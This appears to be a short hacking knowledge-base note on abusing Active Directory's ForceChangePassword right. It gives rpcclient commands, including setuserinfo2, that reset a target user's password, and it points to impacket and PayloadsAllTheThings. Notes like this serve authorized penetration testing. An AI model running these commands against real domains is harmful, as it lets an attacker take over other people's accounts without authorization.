# active directory  ForceChangePassword change user password
can exploit with impacket
payloadsallthethings "Active Directory Attack.md"
```bash
rpcclient $IP -U username -W domain.local
```
within rpcclient shell
```
setuserinfo2 targetuser 23 targetnewpwd
```

# Related
- [20221003151144](/zet/20221003151144/README.md) active directory 
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:
    #assorted #hacking #windows #windows
